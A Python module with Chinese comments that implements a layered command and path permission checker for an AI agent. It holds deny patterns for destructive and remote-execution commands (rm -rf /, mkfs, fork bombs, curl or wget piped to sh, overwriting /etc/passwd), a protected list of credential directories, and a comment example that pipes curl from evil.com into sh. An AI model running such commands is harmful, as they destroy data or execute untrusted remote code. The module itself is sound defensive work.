"""权限系统：命令黑名单 + 路径白名单 + 用户审批。

设计参考 业界 的三道闸门：
  闸门 1：硬拒绝（危险命令、受保护路径）
  闸门 2：规则匹配（破坏性命令模式、工作目录外写入）
  闸门 3：用户审批（通过 callback 询问，带会话内缓存）

L1（黑名单）是零成本防线，防止灾难性误操作。
L2（路径白名单）保护用户文件和密钥。
L3（审批）给用户最终决定权，但会话内缓存避免重复询问。
"""
import json
import logging
import re
from dataclasses import dataclass
from pathlib import Path
from typing import Callable, List, Optional, Tuple

from agent.atomic_io import atomic_write_text


# ---------------------------------------------------------------------------
# 结果类型
# ---------------------------------------------------------------------------
logger = logging.getLogger(__name__)
@dataclass
class PermissionResult:
    allowed: bool
    reason: str
    gate: str = ""  # "deny" / "protected" / "approval" / "ok"


# ---------------------------------------------------------------------------
# 闸门 1：命令硬拒绝黑名单
# ---------------------------------------------------------------------------

# 每条 (正则, 说明)。正则用 IGNORECASE 匹配。
_DENY_COMMAND_PATTERNS: List[Tuple[str, str]] = [
    # 删除根目录/家目录
    (r"\brm\s+-rf?\s+/(?:\s|$|\*)", "rm -rf 根目录"),
    (r"\brm\s+-rf?\s+~(?:\s|$|\*)", "rm -rf home 目录"),
    (r"\brm\s+-rf?\s+\*\s*$", "rm -rf 通配符"),
    # 提权
    (r"\bsudo\b", "sudo 提权"),
    (r"\bsu\s+-\s*\w", "su 切换用户"),
    # 磁盘破坏
    (r"\bmkfs\b", "格式化文件系统"),
    (r"\bdd\s+if=.*of=/dev/", "dd 写设备文件"),
    (r">\s*/dev/sd[a-z]", "覆盖磁盘设备"),
    # fork bomb
    (r":\(\)\s*\{[^}]*\};", "fork bomb"),
    # 系统控制
    (r"\b(?:shutdown|reboot|halt|poweroff)\b", "关机/重启"),
    (r"\bsystemctl\s+(?:stop|disable)", "停止/禁用系统服务"),
    # Windows 破坏
    (r"\bformat\s+[A-Z]:", "format 磁盘"),
    (r"\bdel\s+/[A-Z]*[fs].*\\(?:Windows|Program Files|System32)", "删除 Windows 系统目录"),
    (r"Remove-Item.*-Recurse.*-Force.*\\(?:Windows|Program)", "PowerShell 强删系统目录"),
    (r"\brmdir\s+/s.*\\(?:Windows|Program)", "rmdir /s 删系统目录"),
    # 权限乱改
    (r"\bchmod\s+-R\s+[0-7]+\s+/\s*$", "全盘改权限"),
    (r"\bchown\s+-R\s+.*\s+/\s*$", "全盘改属主"),
    # 危险管道（远程脚本直接执行）
    (r"\bcurl\s+[^|]*\|\s*(?:ba)?sh", "curl 管道执行远程脚本"),
    (r"\bwget\s+[^|]*\|\s*(?:ba)?sh", "wget 管道执行远程脚本"),
    # 覆盖关键系统文件
    (r">\s*/etc/(?:passwd|shadow|sudoers)", "覆盖系统认证文件"),
    # git 危险操作（强推主分支，两种参数顺序都匹配）
    (r"\bgit\s+push\b.*(?:--force|-f)\b.*\b(?:main|master)\b", "强推主分支"),
    (r"\bgit\s+push\b.*\b(?:main|master)\b.*(?:--force|-f)\b", "强推主分支"),
]
# 模块加载时预编译（避免每次 check 都查 re._cache）
_DENY_COMMAND_PATTERNS_COMPILED: List[Tuple["re.Pattern", str]] = [
    (re.compile(pat, re.IGNORECASE), desc)
    for pat, desc in _DENY_COMMAND_PATTERNS
]


def check_command_deny(command: str) -> Optional[str]:
    """闸门 1：检查命令是否命中硬拒绝黑名单。

    返回匹配的说明（拒绝原因），未命中返回 None。
    """
    for pattern, desc in _DENY_COMMAND_PATTERNS_COMPILED:
        if pattern.search(command):
            return desc
    return None


# ---------------------------------------------------------------------------
# 自我保护：禁止修改 OmniMate 自身的依赖（uv add / pip install）
# ---------------------------------------------------------------------------

def check_self_modification(command: str, cwd: Optional[str] = None) -> Optional[str]:
    """闸门 0:禁止 agent 修改 OmniMate 自身的依赖。

    只保护 OmniMate 自己的代码目录(project_root),不保护用户项目:
    - cwd 在 OmniMate 自身目录内:uv add / pip install 拒绝(防止改坏自身依赖)
    - cwd 在用户项目里:装依赖是改代码的正当工作,一律放行
      (用户项目不一定是 Python:前端项目用 npm/pnpm/yarn,Python 项目用 uv/pip)

    返回拒绝原因,未命中返回 None。
    """
    if not cwd:
        return None
    try:
        from constants import project_root
        root = project_root().resolve()
        cwd_resolved = Path(cwd).resolve()
    except Exception:
        return None

    # 只在 OmniMate 自身目录内才拦截
    in_self = cwd_resolved == root
    if not in_self:
        try:
            cwd_resolved.relative_to(root)
            in_self = True
        except ValueError:
            pass
    if not in_self:
        return None

    if re.search(r"\buv\s+add\b", command, re.IGNORECASE):
        return "在 OmniMate 自身目录内 uv add 会修改自身依赖(pyproject.toml),禁止 agent 操作"
    if re.search(r"\bpip\d?\s+install\b", command, re.IGNORECASE):
        return "在 OmniMate 自身目录内 pip install 会污染自身 venv,禁止 agent 操作"
    return None


# ---------------------------------------------------------------------------
# 不可绕过的系统级破坏（即使 bypassPermissions 也拒）
# ---------------------------------------------------------------------------
# 这组模式与 _DENY_COMMAND_PATTERNS 的区别:
# - _DENY_COMMAND_PATTERNS(闸门 1) 在 bypassPermissions 模式下被跳过
# - _FATAL_IRREVERSIBLE_PATTERNS(闸门 0 的子检查) 在任何模式下都拒绝,
#   作为不可绕过的"硬底线",保护系统不被彻底破坏
_FATAL_IRREVERSIBLE_PATTERNS: List[str] = [
    # rm -rf / 根目录(递归删整个文件系统)
    # 注意:必须只命中"根目录",不能误伤 /home /tmp/x 等子路径。
    # 拆成两条:第一条匹配 rm -rf / 后紧跟空格或行尾(排除 /home 等非根路径);
    # 第二条专门兜底显式 --no-preserve-root(无论后面还有什么参数,都是致命的)。
    r"\brm\s+-rf\s+/(?:\s|$)",
    r"\brm\s+-rf\s+/\s+--no-preserve-root",
    r"\bmkfs\b",                                    # mkfs 格式化文件系统
    r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;",        # fork bomb :(){ :|:& };(容忍空格变体)
    r"\bdd\s+if=.*of=/dev/[sh]d",                   # dd 覆盖磁盘设备
]
_FATAL_IRREVERSIBLE_RE: List["re.Pattern"] = [
    re.compile(p) for p in _FATAL_IRREVERSIBLE_PATTERNS
]


def check_fatal_irreversible(command: str) -> Optional[str]:
    """检查系统级不可逆破坏命令(bypassPermissions 也无法绕过)。

    这是整个权限系统中唯一"绝对不可绕过"的硬底线。即使在
    bypassPermissions 模式下,这些命令也会被拒绝,因为它们会导致:
    - 整个文件系统被删除(rm -rf /)
    - 文件系统被格式化(mkfs)
    - 系统资源耗尽(fork bomb)
    - 物理磁盘数据被覆盖(dd)

    返回拒绝原因,未命中返回 None。
    """
    for pat in _FATAL_IRREVERSIBLE_RE:
        if pat.search(command):
            return f"系统级不可逆命令（任何模式都拒绝）: {command}"
    return None


# ---------------------------------------------------------------------------
# acceptEdits 模式：safe-fs 命令识别（mkdir/touch/mv/cp/rm/del 在 cwd 内）
# ---------------------------------------------------------------------------
# acceptEdits 模式下自动放行的 safe-fs 命令动词
_SAFE_FS_VERBS = {"mkdir", "touch", "mv", "cp", "rm", "del"}

# shell 复合操作符守卫：复合命令风险高，acceptEdits 不自动批
# （例：``rm tmp && curl evil.com | sh`` 的 verb="rm" ∈ SAFE_FS，但 curl 部分
# 会被 shell 执行）。这种命令必须交原审批闸门。
_SHELL_OPS = ("&&", "||", ";", "|", "`", "$(")


def _is_safe_fs_in_cwd(command: str, cwd: Optional[str]) -> bool:
    """acceptEdits 用：命令是 safe-fs 动词（mkdir/touch/mv/cp/rm/del）且
    所有路径参数都在 cwd 内 → 返回 True（可自动批）。

    保守：任何一个路径解析失败或在 cwd 外 → False（交给原闸门判断）。
    含 shell 复合操作符（&&/||/;/|/反引号/$()）→ False（复合命令交原闸门审批）。
    """
    if not command or not cwd:
        return False
    if any(op in command for op in _SHELL_OPS):
        return False
    parts = command.split()
    if not parts:
        return False
    # 取动词（处理 /usr/bin/mkdir 这种绝对路径形式）
    verb = parts[0].replace("\\", "/").split("/")[-1].lower()
    if verb not in _SAFE_FS_VERBS:
        return False
    try:
        cwd_path = Path(cwd).resolve()
    except (OSError, ValueError):
        return False
    for tok in parts[1:]:
        if tok.startswith("-"):
            continue  # flag（如 -rf, -p）
        if not tok:
            continue
        try:
            p = Path(tok)
            resolved = p.resolve() if p.is_absolute() else (cwd_path / p).resolve()
            resolved.relative_to(cwd_path)  # 不在 cwd 下会抛 ValueError
        except (ValueError, OSError, RuntimeError):
            return False  # 路径在 cwd 外或解析失败 → 不自动批
    return True


# ---------------------------------------------------------------------------
# 闸门 2：破坏性命令模式（需用户审批才能执行）
# ---------------------------------------------------------------------------

# 这些命令本身不是灾难性的（不在硬拒绝黑名单），但会造成文件删除/覆盖，
# 应该让用户确认。审批 callback 在 cli.py 注入（用 console.input 问 y/n）。
_DESTRUCTIVE_PATTERNS: List[Tuple[str, str]] = [
    (r"\brm\s+(?!-rf?\s+/(?:\s|$|\*))(?!-rf?\s+~)", "rm 删除"),  # rm 但非根目录
    (r"\bdel\s+", "del 删除"),
    (r"\brmdir\s+", "rmdir 删目录"),
    (r"\berase\s+", "erase 删除"),
    (r"\bRemove-Item\b", "PowerShell Remove-Item"),
    (r"\bshred\s+", "shred 安全删除"),
    (r"\btruncate\s+-s\s*0", "truncate 清空文件"),
    (r"\bgit\s+reset\s+--hard", "git reset --hard 丢弃改动"),
    (r"\bgit\s+clean\s+-[fxd]", "git clean 删未跟踪文件"),
]
_DESTRUCTIVE_PATTERNS_COMPILED: List[Tuple["re.Pattern", str]] = [
    (re.compile(pat, re.IGNORECASE), desc)
    for pat, desc in _DESTRUCTIVE_PATTERNS
]


def check_destructive(command: str) -> Optional[str]:
    """闸门 2：检查命令是否是破坏性操作（需要审批）。

    返回匹配的说明，未命中返回 None。
    """
    for pattern, desc in _DESTRUCTIVE_PATTERNS_COMPILED:
        if pattern.search(command):
            return desc
    return None


# ---------------------------------------------------------------------------
# 受保护路径（读写都拒绝）
# ---------------------------------------------------------------------------

_PROTECTED_PATHS = [
    # SSH / AWS / GPG 密钥
    "~/.ssh",
    "~/.aws",
    "~/.gnupg",
    # CLI 凭证
    "~/.config/gh",        # GitHub CLI token
    "~/.docker",           # docker credentials
    "~/.kube",             # kubernetes 凭证
    # Unix 系统目录
    "/etc",
    "/usr",
    "/bin",
    "/sbin",
    "/boot",
    "/proc",
    "/sys",
    "/dev",
    # Windows 系统目录
    "C:\\Windows",
    "C:\\Program Files",
    "C:\\Program Files (x86)",
]
# 模块加载时预计算（避免每次 safe_path 都 14× resolve）
_PROTECTED_PATHS_RESOLVED: List[Tuple[Path, str]] = []
for _p in _PROTECTED_PATHS:
    try:
        _PROTECTED_PATHS_RESOLVED.append((Path(_p).expanduser().resolve(), _p))
    except (OSError, ValueError):
        # 解析失败的条目跳过（极少数环境下可能发生）
        continue


def is_protected_path(path) -> Optional[str]:
    """检查路径是否在受保护列表（读写都拒绝）。

    返回匹配的保护项（拒绝原因），未命中返回 None。
    """
    try:
        resolved = Path(path).expanduser().resolve()
    except (OSError, ValueError):
        return None

    for prot, orig in _PROTECTED_PATHS_RESOLVED:
        if resolved == prot:
            return orig
        # path 在 protected 下
        try:
            resolved.relative_to(prot)
            return orig
        except ValueError:
            continue
    return None


# ---------------------------------------------------------------------------
# 写保护路径（只禁写,允许读——agent 可以读项目代码,但不能改）
# ---------------------------------------------------------------------------

_WRITE_PROTECTED_PATHS: List[Tuple[Path, str]] = []
try:
    from constants import project_root
    _WRITE_PROTECTED_PATHS.append((project_root().resolve(), "项目代码目录"))
except Exception:
    pass


def is_write_protected_path(path) -> Optional[str]:
    """检查路径是否在写保护列表(只禁写,不禁读)。

    用于防止 agent 修改项目自身的代码。
    """
    try:
        resolved = Path(path).expanduser().resolve()
    except (OSError, ValueError):
        return None

    for prot, orig in _WRITE_PROTECTED_PATHS:
        if resolved == prot:
            return orig
        try:
            resolved.relative_to(prot)
            return orig
        except ValueError:
            continue
    return None


# ---------------------------------------------------------------------------
# 路径白名单（写操作检查）
# ---------------------------------------------------------------------------

def default_allowed_roots() -> List[Path]:
    """默认允许写入的根目录：cwd + ~/.OmniMate。"""
    roots = [Path.cwd().resolve()]
    try:
        from constants import get_omnimate_home
        roots.append(get_omnimate_home().resolve())
    except Exception:
        pass
    return roots


def safe_path(
    path,
    *,
    write: bool = False,
    allowed_roots: Optional[List] = None,
) -> PermissionResult:
    """检查路径是否安全可访问。

    读：不在 _PROTECTED_PATHS 即可。
    写：不在 _PROTECTED_PATHS 且在 allowed_roots 之一下。

    返回 PermissionResult。
    """
    # 先检查受保护路径（读写都拒）
    prot = is_protected_path(path)
    if prot:
        return PermissionResult(False, f"受保护路径: {prot}", "protected")

    if not write:
        return PermissionResult(True, "ok", "ok")

    # 写保护路径(只禁写:项目代码目录)
    wprot = is_write_protected_path(path)
    if wprot:
        return PermissionResult(
            False,
            f"写保护(项目代码保护,不允许修改): {wprot}",
            "protected",
        )

    # 写操作检查白名单
    if allowed_roots is None:
        allowed_roots = default_allowed_roots()
    allowed_roots = [Path(p).resolve() for p in allowed_roots]

    try:
        resolved = Path(path).expanduser().resolve()
    except (OSError, ValueError) as e:
        return PermissionResult(False, f"路径解析失败: {e}", "protected")

    for root in allowed_roots:
        try:
            if resolved == root:
                return PermissionResult(True, "白名单内", "ok")
            resolved.relative_to(root)
            return PermissionResult(True, "白名单内", "ok")
        except ValueError:
            continue
        except (OSError, ValueError):
            continue

    return PermissionResult(
        False,
        f"写入路径不在白名单: {resolved}（允许: {allowed_roots}）",
        "protected",
    )


# ---------------------------------------------------------------------------
# 完整命令权限检查器（带审批缓存）
# ---------------------------------------------------------------------------

class PermissionChecker:
    """命令执行权限检查器。

    三道闸门：
      1. 硬拒绝（黑名单）
      2. 破坏性命令（rm/del 等）需用户审批
      3. 其他命令默认通过

    持久化白名单：用户批准过的破坏性命令存 JSON，跨会话不再询问。
    会话内缓存：本次会话批准过的命令不重复问（_approved）。
    """

    def __init__(
        self,
        approval_callback: Optional[Callable[[str], bool]] = None,
        whitelist_file=None,
        paths_whitelist_file=None,
        mode: str = "default",  # "default" | "bypassPermissions" | "acceptEdits"
        hooks_registry=None,  # round3 D2 NEW: 权限审计 hook
    ):
        """
        参数：
            approval_callback: fn(command: str) -> bool，破坏性命令 / 路径审批。
                              callback 内部可根据字符串内容判断是命令还是路径
                              （含 / 或 \\ 或 ~ 开头 → 路径）。
            whitelist_file: 持久化白名单 JSON 路径（如 ~/.OmniMate/approved_commands.json）。
            paths_whitelist_file: 路径白名单 JSON（如 ~/.OmniMate/approved_paths.json）。
                                  用户批准过的写入路径，跨会话不再询问。
            mode: 权限模式。
                  - "default": 三道闸门全开（黑名单 + 破坏性审批 + 默认通过）。
                  - "bypassPermissions": 跳过闸门 1/2/3,直接放行所有命令;
                    但仍保留闸门 0(自我保护 + fatal 硬底线)。
                    用于 Claude Code 兼容的 --dangerously-skip-permissions 场景。
                  - "acceptEdits": cwd 内 safe-fs（mkdir/touch/mv/cp/rm/del）命令和
                    cwd 内写入自动放行，其他命令走原三道闸门（fatal 底线 + 自我保护 +
                    受保护路径仍生效）。适合 agent 连续编辑代码场景。
            hooks_registry: 可选的 HookRegistry，用于触发 PERMISSION_REQUEST /
                           PERMISSION_DENIED 审计事件。fail-open：hook 异常不影响权限判断。
        """
        self.approval_callback = approval_callback
        self._approved = set()  # 会话内缓存（命令）
        self._whitelist_file = whitelist_file
        self._persistent_whitelist = set()
        if whitelist_file:
            self._load_whitelist()
        # 路径白名单（write_file 等场景，用户批准过的写入路径）
        self._paths_whitelist_file = paths_whitelist_file
        self._approved_paths = set()
        if paths_whitelist_file:
            self._load_paths_whitelist()
        # 权限模式（default / bypassPermissions / acceptEdits）
        if mode not in ("default", "bypassPermissions", "acceptEdits"):
            raise ValueError(f"非法 permission_mode: {mode}")
        self.mode = mode
        # round3 D2 NEW: hooks registry 引用（可选，None=不触发审计 hook）
        self._hooks_registry = hooks_registry
        # OS 沙箱模式（off | on）；运行时通过 set_sandbox_mode() 切换
        # 实际 wrapper 注入由 terminal_tool 负责（基于本字段的值决定走哪条路径）
        self.sandbox_mode = "off"

    def _deny(self, command: str, reason: str, deny_type: str = "deny") -> "PermissionResult":
        """round3 D2 NEW: 统一 deny helper。

        触发 PERMISSION_DENIED 审计 hook（fail-open）后返回 PermissionResult(False)。
        所有 check() 的拒绝路径都走这个 helper，保证审计事件不遗漏。
        """
        if self._hooks_registry is not None:
            try:
                self._hooks_registry.run_permission_denied({
                    "command": command,
                    "reason": reason,
                    "deny_type": deny_type,
                })
            except Exception:
                pass  # fail-open：hook 异常不影响权限判断
        return PermissionResult(False, reason, deny_type)

    def _load_whitelist(self):
        """加载持久化白名单。"""
        if not self._whitelist_file:
            return
        try:
            path = Path(self._whitelist_file)
            if path.exists():
                data = json.loads(path.read_text(encoding="utf-8"))
                self._persistent_whitelist = set(data.get("commands", []))
                logger.info("加载 %d 条已批准命令", len(self._persistent_whitelist))
        except Exception as e:
            logger.debug("加载白名单失败: %s", e)

    def _save_whitelist(self):
        """保存持久化白名单（原子写）。"""
        if not self._whitelist_file:
            return
        try:
            path = Path(self._whitelist_file)
            atomic_write_text(
                path,
                json.dumps(
                    {"commands": sorted(self._persistent_whitelist)},
                    ensure_ascii=False,
                    indent=2,
                ),
            )
        except Exception as e:
            logger.debug("保存白名单失败: %s", e)

    def _load_paths_whitelist(self):
        """加载路径白名单。"""
        if not self._paths_whitelist_file:
            return
        try:
            path = Path(self._paths_whitelist_file)
            if path.exists():
                data = json.loads(path.read_text(encoding="utf-8"))
                self._approved_paths = set(data.get("paths", []))
                logger.info("加载 %d 条已批准写入路径", len(self._approved_paths))
        except Exception as e:
            logger.debug("加载路径白名单失败: %s", e)

    def _save_paths_whitelist(self):
        """保存路径白名单（原子写）。"""
        if not self._paths_whitelist_file:
            return
        try:
            path = Path(self._paths_whitelist_file)
            atomic_write_text(
                path,
                json.dumps(
                    {"paths": sorted(self._approved_paths)},
                    ensure_ascii=False,
                    indent=2,
                ),
            )
        except Exception as e:
            logger.debug("保存路径白名单失败: %s", e)

    def check(
        self,
        command: str,
        cwd: Optional[str] = None,
        *,
        mode_override: Optional[str] = None,
    ) -> PermissionResult:
        """检查命令是否允许执行。

        参数：
            mode_override: 可选的 mode 覆盖（"default" / "bypassPermissions"）。
                          优先于 self.mode，用于子代理按 agent_ref.permission_mode
                          做决策，而不污染全局 checker 状态（线程安全）。
        """
        # 决定本次 check 使用的 effective mode（override 优先）
        effective_mode = mode_override or self.mode

        # 闸门 0:不可绕过的底线（自我保护 + 系统级 fatal）
        # 这两道检查在任何 mode（包括 bypassPermissions）下都执行
        self_violation = check_self_modification(command, cwd)
        if self_violation:
            return self._deny(command, f"自我保护: {self_violation}", "deny")
        fatal = check_fatal_irreversible(command)
        if fatal:
            return self._deny(command, f"硬底线: {fatal}", "deny")

        # bypassPermissions 模式:跳过闸门 1/2/3,直接放行剩余所有命令
        # 适用场景:Claude Code 兼容的 --dangerously-skip-permissions,
        # 用户已明确接受风险,不需要审批。闸门 0 的两道底线仍生效。
        if effective_mode == "bypassPermissions":
            return PermissionResult(True, "bypassPermissions 模式放行", "bypass")

        # acceptEdits: safe-fs 命令在 cwd 内自动放行；其他命令走原闸门
        if effective_mode == "acceptEdits" and _is_safe_fs_in_cwd(command, cwd):
            return PermissionResult(True, "acceptEdits: safe-fs in cwd", "auto")

        # 闸门 1：硬拒绝
        deny = check_command_deny(command)
        if deny:
            return self._deny(command, f"硬拒绝: {deny}", "deny")

        # 闸门 2：破坏性命令（需要审批）
        destructive = check_destructive(command)
        if destructive:
            cmd_key = command.strip()

            # 先检查持久化白名单 + 会话缓存
            if cmd_key in self._persistent_whitelist or cmd_key in self._approved:
                return PermissionResult(True, "已批准（白名单）", "approval")

            if self.approval_callback is None:
                return self._deny(
                    command,
                    f"破坏性命令需用户确认: {destructive}",
                    "destructive",
                )

            # round3 D2 NEW: PERMISSION_REQUEST 审计（进入用户审批前）
            if self._hooks_registry is not None:
                try:
                    self._hooks_registry.run_permission_request({
                        "command": command,
                        "reason": destructive,
                    })
                except Exception:
                    pass  # fail-open

            try:
                approved = bool(self.approval_callback(command))
            except Exception:
                approved = False

            if not approved:
                return self._deny(command, "用户拒绝", "approval")

            # 批准：加入会话缓存 + 持久化白名单
            self._approved.add(cmd_key)
            self._persistent_whitelist.add(cmd_key)
            self._save_whitelist()
            return PermissionResult(True, "已批准", "approval")

        # 闸门 3：默认通过
        return PermissionResult(True, "ok", "ok")

    def check_path(
        self,
        path,
        *,
        write: bool = False,
        allowed_roots: Optional[List] = None,
        mode_override: Optional[str] = None,
    ) -> PermissionResult:
        """检查文件路径是否可访问。

        规则(用户授权:除了项目代码,其他都可以改):
        - 读:受保护路径(~/.ssh 等)拒,其他允许
        - 写:
          闸门 1:受保护路径(~/.ssh / /etc / C:\\Windows 等)→ 硬拒(安全底线)
          闸门 2:写保护路径(项目代码目录)→ 硬拒(防入侵)
          闸门 3:其他全通过(用户已授权)

        参数：
            mode_override: 可选的 mode 覆盖。bypassPermissions 时跳过写保护（项目代码）
                          之外的写约束（仍受 is_protected_path 硬底线限制）。
        """
        # 决定本次 check_path 使用的 effective mode
        effective_mode = mode_override or self.mode

        # 闸门 1:受保护路径硬拒（任何模式下都拒——安全底线）
        prot = is_protected_path(path)
        if prot:
            return self._deny(str(path), f"受保护路径: {prot}", "protected")

        if not write:
            return PermissionResult(True, "ok", "ok")

        # acceptEdits: cwd 内写入自动放行
        # 受保护路径已在闸门 1 拒掉（~/.ssh 等仍拒），此处只处理 cwd 内合法写入。
        if effective_mode == "acceptEdits":
            import os
            try:
                cwd_path = Path(os.getcwd()).resolve()
                resolved = Path(path).expanduser().resolve()
                resolved.relative_to(cwd_path)
                return PermissionResult(True, "acceptEdits: write in cwd", "auto")
            except (ValueError, OSError, RuntimeError):
                pass  # cwd 外 → 继续走下面的写保护/白名单检查

        # 闸门 2:写保护路径(项目代码目录)→ 拒
        # bypassPermissions 模式下也保留此检查（防 agent 改自身代码）。
        wprot = is_write_protected_path(path)
        if wprot:
            return self._deny(str(path), f"写保护(项目代码): {wprot}", "protected")

        # 闸门 3:其他全通过(用户授权)。
        # bypassPermissions 模式下同样全通过（写白名单约束在 safe_path 中已弱化为"其他全通过"，
        # check_path 本就不再做白名单检查）。
        return PermissionResult(True, "ok", "ok")

    def add_to_whitelist(self, command: str):
        """手动加入持久化白名单。"""
        self._persistent_whitelist.add(command.strip())
        self._save_whitelist()

    def remove_from_whitelist(self, command: str) -> bool:
        """从持久化白名单移除。返回是否找到并移除。"""
        before = len(self._persistent_whitelist)
        self._persistent_whitelist.discard(command.strip())
        if len(self._persistent_whitelist) < before:
            self._save_whitelist()
            return True
        return False

    def list_whitelist(self) -> list:
        """列出持久化白名单（排序）。"""
        return sorted(self._persistent_whitelist)

    def reset_cache(self):
        """清空会话内缓存（不影响持久化白名单）。"""
        self._approved.clear()

    def set_sandbox_mode(self, mode: str) -> None:
        """切换 OS 沙箱模式（/sandbox 命令调）。

        参数：
            mode: "off" 关闭（默认）或 "on" 开启。
                  on 时 terminal_tool 会把命令包进 bwrap/seatbelt wrapper。
                  不可用时走 fail-open 降级（警告 + 原路径）。

        异常：
            ValueError: mode 不在 ("off", "on") 中。
        """
        if mode not in ("off", "on"):
            raise ValueError(f"非法 sandbox_mode: {mode}（仅支持 off / on）")
        self.sandbox_mode = mode


# 全局默认 checker（无审批，只走闸门 1/2）
_default_checker = PermissionChecker()


def get_default_checker() -> PermissionChecker:
    return _default_checker


def set_default_checker(checker: PermissionChecker) -> None:
    """设置全局默认 checker（CLI 启动时调用，注入审批 callback）。"""
    global _default_checker
    _default_checker = checker
